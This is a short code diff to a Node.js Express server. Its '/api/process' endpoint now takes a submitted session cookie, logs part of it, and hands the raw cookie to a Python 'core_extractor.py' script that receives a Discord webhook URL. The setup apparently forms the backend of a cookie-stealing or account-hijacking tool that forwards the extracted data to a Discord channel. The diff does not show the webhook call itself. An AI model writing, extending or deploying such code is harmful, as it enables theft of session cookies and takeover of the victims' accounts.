@@ -19,17 +19,23 @@ app.get('/', (req, res) => {
 
 // API Processing Endpoint
 app.post('/api/process', (req, res) => {
-    const { data } = req.body;
+    // Support both req.body.cookie and req.body.data flexibly
+    const rawCookie = req.body.cookie || req.body.data;
 
-    if (!data) {
-        return res.status(400).json({ success: false, error: 'No data provided' });
+    if (!rawCookie) {
+        return res.status(400).json({ success: false, error: 'No cookie provided' });
     }
 
-    // Ensure Render's environment variable is explicitly mapped down to the child process environment
-    const pythonProcess = spawn('python3', ['core_extractor.py', String(data)], {
+    const cookieStr = String(rawCookie).trim();
+
+    // SAFE DEBUG LOG (Node): Length and first 12 chars ONLY
+    console.log(`[Node Debug] Received from request -> Length: ${cookieStr.length}, Start: ${cookieStr.substring(0, 12)}...`);
+
+    // Pass raw string directly (NO base64 encoding)
+    const pythonProcess = spawn('python3', ['core_extractor.py', cookieStr], {
         env: {
             ...process.env,
-            DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL // Passes your Render dashboard variable directly
+            DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL
         }
     });
 
